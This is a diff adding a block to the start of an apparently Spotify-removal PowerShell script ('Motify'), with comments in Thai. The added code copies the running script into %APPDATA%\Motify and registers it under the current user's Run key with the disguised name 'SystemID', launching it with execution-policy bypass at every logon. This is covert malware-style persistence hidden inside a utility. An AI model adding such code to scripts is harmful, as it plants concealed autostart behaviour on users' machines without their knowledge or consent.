@@ -1,3 +1,28 @@
+# ขั้นตอนที่ 1: กำหนดพาธที่ต้องการสร้างโฟลเดอร์
+$appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
+$MotifyPath = "$env:APPDATA\Motify"
+
+# ขั้นตอนที่ 2: ตรวจสอบว่าโฟลเดอร์ Motify มีอยู่แล้วหรือไม่ ถ้าไม่ให้สร้างใหม่
+if (-not (Test-Path -Path $MotifyPath)) {
+    New-Item -ItemType Directory -Path $MotifyPath -Force | Out-Null
+}
+
+# ขั้นตอนที่ 3: สำรองไฟล์ที่กำลังรันอยู่ไปยังโฟลเดอร์ Motify
+$scriptPath = $MyInvocation.MyCommand.Path
+$backupScriptPath = "$MotifyPath\$(Split-Path $scriptPath -Leaf)"  # ชื่อไฟล์เดียวกัน
+
+# คัดลอกไฟล์ไปยังโฟลเดอร์ Motify
+Copy-Item -Path $scriptPath -Destination $backupScriptPath -Force
+
+# ขั้นตอนที่ 4: ตั้งค่า Registry ให้รันไฟล์ที่สำรองใน Motify
+$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "SystemID"
+
+# ใช้พาธที่อยู่ใน Motify folder เป็นค่าใน Registry
+Set-ItemProperty -Path $regKeyPath -Name $regName -Value "powershell -ExecutionPolicy Bypass -File '$backupScriptPath'"
+
+
+
 function Remove-Spotify {
 $batchScript = @"
 @echo off
